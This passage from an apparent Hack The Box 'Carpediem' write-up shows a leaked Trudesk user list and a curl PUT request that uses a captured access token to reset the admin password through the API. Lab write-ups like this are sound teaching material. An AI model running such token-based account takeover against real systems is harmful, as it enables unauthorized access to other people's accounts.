font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-03-30T14:21:15.212Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c3471e0d4d001b0740d7"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c0be1e0d4d001b0740d4"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jhammond"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jhammond@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Jeremy Hammond"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Sr. Systems Engineer"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for agents"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-01T23:36:55.940Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c0be1e0d4d001b0740d4"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c28f1e0d4d001b0740d6"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jpardella"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jpardella@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Joey Pardella"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Desktop Support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for agents"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"support"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-07T20:33:20.918Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c28f1e0d4d001b0740d6"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c69d1acd1559cdb4019b"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"svc-portal-tickets"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tickets@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Portal Tickets"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13a"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"User"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for users"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13a"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-03-30T13:50:02.824Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c69d1acd1559cdb4019b"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13c"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Robert Frost"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rfrost@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba138"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for admins"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba138"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Sr. Network Engineer"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-07T20:30:32.198Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13c"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}]}</span></span></code></pre></div>
<p>With the help of Burp extension <em>Add Custom Header</em> add the accessToken and add it to all sessions (Project Options &gt; Sessions &gt; Session Handling Rules &gt; Invoke a Burp extension ), don’t forget to add the rule to be applied to <em>Proxy</em> as well.</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem13.png" class="img-fluid"></p>
<p>We’re not able to bypass the login, so I guess we should focus on the api instead.</p>
</section>
<section id="step-6---pwn-admin" class="level3">
<h3 class="anchored" data-anchor-id="step-6---pwn-admin">Step 6 - Pwn Admin</h3>
<p>Playing around with the API we have a few options, lets start by trying to change the password of the <em>admin</em> account.</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-X</span> PUT <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type: applications/json"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{"</span>aPass<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">":"</span>aaAA123<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\!</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">", "</span>aPassconfirm<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">":"</span>aaAA123<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\!</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"}"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span> http://trudesk.carpediem.htb/api/v1/users/admin  </span>
<span id="cb24-2"></span>
<span id="cb24-3"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"success"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
